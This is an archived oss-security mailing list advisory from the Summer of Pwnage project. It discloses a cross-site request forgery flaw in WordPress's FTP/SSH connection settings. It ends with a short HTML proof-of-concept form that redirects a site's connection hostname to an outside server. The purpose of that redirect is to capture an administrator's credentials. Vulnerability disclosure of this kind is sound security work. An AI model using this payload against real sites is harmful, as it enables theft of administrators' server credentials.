X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3968" "Friday" "21" "April" "2017" "00:30:31" "+0200" "Summer of Pwnage" "lists@securify.nl" "<c1e731cf-2841-56d0-4be7-a2ae98edd66e@securify.nl>" "86" "[oss-security] Cross-Site Request Forgery in WordPress Connection Information" nil nil nil "4" "2017042022:30:31" "[oss-security] Cross-Site Request Forgery in WordPress Connection Information" (number mark "U       lists@securi Apr 21   86/3968  " thread-indent "\"[oss-security] Cross-Site Request Forgery in WordPress Connection Information\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 28006 invoked by uid 550); 20 Apr 2017 22:30:45 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 27977 invoked from network); 20 Apr 2017 22:30:43 -0000
X-Virus-Scanned: amavisd-new at edge2.intern.zimbra-login.net
From: Summer of Pwnage <lists@securify.nl>
To: oss-security@lists.openwall.com
Organization: Securify B.V.
Message-ID: <c1e731cf-2841-56d0-4be7-a2ae98edd66e@securify.nl>
Date: Fri, 21 Apr 2017 00:30:31 +0200
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
 Thunderbird/45.8.0
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 7bit
Subject: [oss-security] Cross-Site Request Forgery in WordPress Connection Information

------------------------------------------------------------------------
Cross-Site Request Forgery in WordPress Connection Information
------------------------------------------------------------------------
Yorick Koster, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
The FTP/SSH form functionality of WordPress was found to be vulnerable
to Cross-Site Request Forgery. This vulnerability can be used to
overwrite the FTP or SSH connection settings of the affected WordPress
site. An attacker can use this issue to trick an Administrator into
logging into the attacker's FTP or SSH server, disclosing his/her login
credentials to the attacker. In order to exploit this vulnerability, the
attacker has to lure/force a logged on WordPress Administrator into
opening a malicious website.


------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160717-0004

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on the WordPress [2] version 4.5.3 up
till and including version 4.7.4.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
There is currently no fix available.

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
WordPress is web software you can use to create a website, blog, or
app. It was found that the FTP/SSH form functionality is vulnerable to
Cross-Site Request Forgery. This vulnerability can be used by an
attacker to overwrite the FTP or SSH connection settings of the affected
WordPress site. It can be used to trick in an Administrator into login
into the attacker's FTP or SSH server, disclosing his/her login
credentials to the attacker.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
This issue exists in the method request_filesystem_credentials()
(/wp-admin/includes/file.php). It allows overwriting of the values:

- hostname
- username
- connection_type

The request_filesystem_credentials() method is called in various
locations in WordPress. The connection information is updated if a POST
request contains a password or public & private key value (in case of
connection type ssh). In order to trigger this issue, the WordPress
installation must not be able to write to the wp-content folder. Also,
the attacker has to lure/force a logged on WordPress Administrator into
opening a malicious website.

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
<html>
	<body>
		<form action="http://<target>/wp-admin/plugins.php" method="POST">
			<input type="hidden" name="hostname" value="sumofpwn.nl" />
			<input type="hidden" name="connection_type" value="ftp" />
			<input type="hidden" name="password" value="password" />
			<input type="submit" value="Submit request" />
		</form>
	</body>
</html>
------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] 
https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_connection_information.html
[2] https://wordpress.org/
------------------------------------------------------------------------
Summer of Pwnage (https://sumofpwn.nl) is a Dutch community project. Its
goal is to contribute to the security of popular, widely used OSS
projects in a fun and educational way.
